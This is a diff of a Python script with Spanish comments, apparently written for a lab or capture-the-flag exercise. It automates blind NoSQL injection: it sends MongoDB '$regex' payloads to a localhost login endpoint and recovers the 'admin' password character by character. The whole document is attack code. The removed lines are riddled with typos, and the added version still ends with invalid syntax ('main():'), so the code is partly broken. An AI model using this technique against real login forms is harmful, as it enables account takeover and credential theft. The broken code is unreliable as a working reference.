@@ -1,53 +1,62 @@
-# NoSQLI
-'''python
-
+```python
 #!/usr/bin/python3
 
+# Importamos las bibliotecas necesarias
+from pwn import *  # Librería para interactuar con programas
+import requests  # Librería para hacer peticiones HTTP
+import time  # Librería para trabajar con tiempos
+import sys  # Librería para interactuar con el sistema
+import signal  # Librería para manejar señales
+import string  # Librería para trabajar con cadenas de caracteres
 
-from pwn import * <!--# jugar con las barras de progresos-->
-import requests <!--#hacer peticiones a servidores-->
-import time <!--# tiempos de espera-->
-import sys <!--# para poder realizar la salida del progama-->
-import signal <!--# para pillar el ctrl_c-->
-import string <!--# para declara toos los caracteres que quiero probar-->
- 
-def saliendo(sig, frame): <!--#capturando el controll c para escapar del programa-->
-        print('\n\n[+] Saliendo...\n\n')
-        sys.exit(1)
+# Función que maneja la señal SIGINT (Control + C)
+def saliendo(sig, frame):
+    print('\n\n[+] Saliendo...\n\n')
+    sys.exit(1)
 
-<!--# Capturar control C-->
-signal.signal(signal.SIGINT, saliendo) <!--# cuando hagamos ctrl_c mandamos el flujo del progama a la funcion saliendo-->
+# Capturamos la señal SIGINT y la manejamos con la función "saliendo"
+signal.signal(signal.SIGINT, saliendo)
 
-login_url = "http://localhost:4000user/login"  <!--#url a la que hacer el post-->
-caracteres = string.ascii_lowercase + string.asciii_uppercase + string.digits <!-- #caracteres a probar,no metemos simbolos, se puede meter-->
+# URL de la página de login
+login_url = "http://localhost:4000/user/login"
 
+# Definimos los caracteres a probar (letras minúsculas, mayúsculas y dígitos)
+caracteres = string.ascii_lowercase + string.ascii_uppercase + string.digits
+
+# Función para realizar una inyección NoSQL
 def nosqli():
+    password = ""  # Almacenamos la contraseña a medida que la descubrimos
 
-      password = "" <!--#la creamos vacia para in metiendo los caracteres correctos-->
+    # Creamos una barra de progreso para la fuerza bruta
+    p1 = log.progress("Fuerza bruta")
+    p1.status("Iniciando ...")  # Mostramos un mensaje inicial
 
-      p1 = log.progress("Fuerza bruta") <!--# creamos la primera barra de progreso-->
-      p1.status( " Iniciando ...")      <!--# la actualizamos-->
-      
-      time.sleep(2)  <!--# dejamos dos segundos para q lea el usuario-->
-      
-      p2 = log.progress("Password")   <!--# creamos la segunda barra de progreso--> 
-        
-      for posicion in range (0,24):  <!--# creamos las iteraciones-->
-              for caracter in caracteres:
-                      post_data = {"username":"admin","password": {"$regex":"^%s%s"}} % (password,caracter) <!--#lo ponemos en raw , ^%s es que mpieza por algo, por una string -->
+    time.sleep(2)  # Esperamos 2 segundos para dar tiempo al usuario
 
-                      p1.status(post_data)
+    # Creamos otra barra de progreso para mostrar la contraseña
+    p2 = log.progress("Password")
 
-                      headers = {'Content-Type': 'application/json'} 
-                      
-                      respuesta = requsts.post(login_url, headers=headers, data=post_data)
-                        
-                      if "Logged in as user" in respuesta.text:
-                              password += caracter
-                              p2.status(password)  
-                              break
+    # Iteramos a través de las posiciones en la contraseña (hasta 24 caracteres)
+    for posicion in range(0, 24):
+        for caracter in caracteres:  # Probamos cada caracter en la posición actual
+            # Creamos los datos del POST con el caracter actual y la contraseña parcial
+            post_data = {
+                "username": "admin",
+                "password": {"$regex": "^%s%s" % (password, caracter)}
+            }
 
-main()
+            p1.status(post_data)  # Mostramos los datos del POST en la barra de progreso
 
-        nosqli()
-'''
+            headers = {'Content-Type': 'application/json'}  # Encabezados para la solicitud
+            respuesta = requests.post(login_url, headers=headers, json=post_data)  # Realizamos la solicitud POST
+
+            # Si encontramos la cadena "Logged in as user" en la respuesta, hemos adivinado un caracter correcto
+            if "Logged in as user" in respuesta.text:
+                password += caracter  # Agregamos el caracter a la contraseña
+                p2.status(password)  # Mostramos la contraseña actual en la barra de progreso
+                break  # Salimos del bucle interno, ya que hemos encontrado el caracter correcto
+
+main():
+    nosqli()  # Ejecutamos la función "nosqli" si el script se ejecuta directamente
+
+
